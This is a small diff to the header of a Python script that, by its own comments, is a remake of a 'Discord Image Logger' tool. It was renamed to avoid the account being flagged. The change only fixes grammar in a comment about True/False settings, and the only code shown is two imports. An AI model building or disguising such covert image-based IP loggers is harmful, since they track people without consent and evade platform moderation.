@@ -1,7 +1,7 @@
 # Formerly named "Discord Image Logger" (its a good name but I dont want to get my account flagged/suspended!!)
 # By DeKrypt | https://github.com/dekrypted
 # Remade by fishyramen, 99.9% of credit goes to DeKrypt, (he's a genius like me) all i did was fix it to work again | https://github.com/fishyramen
-# If it don't work it might be because when switching false to true or true to false you should the first letter in caps like "False" or "True" or it won't work!!
+# If it don't work it might be because when switching false to true or true to false you have to make the first letter in caps like "False" or "True" or it won't work!!
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
